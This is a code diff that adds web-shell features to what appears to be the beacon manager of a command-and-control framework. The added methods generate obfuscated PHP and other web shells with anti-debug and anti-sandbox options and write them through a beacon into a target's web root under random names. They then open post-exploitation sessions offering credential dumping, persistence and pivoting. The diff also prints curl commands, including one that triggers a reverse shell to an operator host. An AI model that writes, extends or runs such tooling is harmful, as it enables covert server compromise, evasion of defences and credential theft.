@@ -496,6 +496,206 @@ class BeaconManager:
                     "SELECT * FROM loot ORDER BY created_at DESC"
                 ).fetchall()
             return [dict(row) for row in rows]
+    
+    # ============== Web Shell Integration ==============
+    
+    def deploy_webshell(
+        self, 
+        beacon_id: str, 
+        target_path: str,
+        shell_type: str = "php",
+        obfuscation: int = 3,
+        password: str = ""
+    ) -> dict:
+        """
+        Deploy web shell via beacon to target path
+        
+        Args:
+            beacon_id: Target beacon ID
+            target_path: Path to deploy web shell
+            shell_type: Shell type (php, aspx, jsp, etc.)
+            obfuscation: Obfuscation level (0-5)
+            password: Authentication password
+            
+        Returns:
+            Dict with deployment status and shell info
+        """
+        try:
+            # Import web shell generator
+            from evasion.web_shell import (
+                WebShellGenerator, 
+                WebShellConfig, 
+                ShellType, 
+                ObfuscationLevel,
+                EvasionTechnique
+            )
+            
+            # Create shell config
+            config = WebShellConfig(
+                shell_type=ShellType(shell_type),
+                obfuscation_level=ObfuscationLevel(obfuscation),
+                password=password,
+                evasion_techniques=[
+                    EvasionTechnique.STRING_CONCAT,
+                    EvasionTechnique.DEAD_CODE_INJECTION,
+                    EvasionTechnique.VARIABLE_RENAME
+                ],
+                anti_debug=True,
+                anti_sandbox=True,
+                encrypted_comms=True
+            )
+            
+            # Generate shell
+            generator = WebShellGenerator(config)
+            payload = generator.generate()
+            
+            # Encode for transport
+            encoded_payload = base64.b64encode(payload.code.encode()).decode()
+            
+            # Queue task to write file on target
+            task_id = self.queue_task(
+                beacon_id,
+                "file_write",
+                [target_path, encoded_payload, "base64"]
+            )
+            
+            return {
+                "success": True,
+                "task_id": task_id,
+                "shell_path": target_path,
+                "shell_type": shell_type,
+                "obfuscation": ObfuscationLevel(obfuscation).name,
+                "size_bytes": payload.size_bytes,
+                "hash_md5": payload.hash_md5,
+                "password": password,
+                "note": "Shell will be deployed when beacon checks in"
+            }
+            
+        except ImportError as e:
+            return {
+                "success": False,
+                "error": f"Web shell module not available: {e}"
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e)
+            }
+    
+    def upgrade_to_webshell(self, beacon_id: str, webshell_url: str, password: str = "") -> dict:
+        """
+        Upgrade beacon connection to web shell for enhanced capabilities
+        
+        Args:
+            beacon_id: Current beacon ID
+            webshell_url: URL of deployed web shell
+            password: Web shell authentication password
+            
+        Returns:
+            Dict with upgrade status
+        """
+        try:
+            from evasion.web_shell import PostExploitEngine
+            
+            # Create post-exploitation session
+            session = PostExploitEngine(webshell_url, password)
+            
+            # Test connection
+            info = session.system_info()
+            
+            if info:
+                # Store session reference
+                session_id = hashlib.md5(webshell_url.encode()).hexdigest()[:12]
+                
+                return {
+                    "success": True,
+                    "beacon_id": beacon_id,
+                    "session_id": session_id,
+                    "webshell_url": webshell_url,
+                    "system_info": info,
+                    "capabilities": [
+                        "command_exec",
+                        "file_operations",
+                        "port_scan",
+                        "ssrf_probe",
+                        "credential_dump",
+                        "persistence",
+                        "pivot"
+                    ],
+                    "note": "Beacon upgraded to web shell session with enhanced post-exploitation capabilities"
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": "Could not connect to web shell"
+                }
+                
+        except ImportError as e:
+            return {
+                "success": False,
+                "error": f"Web shell module not available: {e}"
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e)
+            }
+    
+    def beacon_to_shell_transition(
+        self, 
+        beacon_id: str,
+        web_root: str = "/var/www/html",
+        shell_name: str = None
+    ) -> dict:
+        """
+        Seamless transition from beacon to web shell
+        
+        This method:
+        1. Generates an obfuscated web shell
+        2. Deploys it via the beacon
+        3. Verifies deployment
+        4. Returns shell access info
+        
+        Args:
+            beacon_id: Source beacon ID
+            web_root: Web root directory path
+            shell_name: Optional custom shell filename
+            
+        Returns:
+            Dict with transition status and access info
+        """
+        import random
+        import string
+        
+        # Generate random filename if not provided
+        if not shell_name:
+            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
+            shell_name = f"{random_name}.php"
+        
+        target_path = f"{web_root}/{shell_name}"
+        
+        # Generate password
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        
+        # Deploy shell
+        result = self.deploy_webshell(
+            beacon_id=beacon_id,
+            target_path=target_path,
+            shell_type="php",
+            obfuscation=4,  # Paranoid level
+            password=password
+        )
+        
+        if result.get("success"):
+            result["shell_access"] = {
+                "url_hint": f"http://[TARGET_IP]/{shell_name}",
+                "password": password,
+                "auth_example": f"curl -X POST http://[TARGET_IP]/{shell_name} -d 'action=info&key={password}'",
+                "reverse_shell": f"curl -X POST http://[TARGET_IP]/{shell_name} -d 'action=reverse&key={password}&host=[YOUR_IP]&port=4444'"
+            }
+            result["note"] = "Web shell deployed. Beacon will write file on next check-in."
+        
+        return result
 
 
 # ============== Singleton accessor ==============
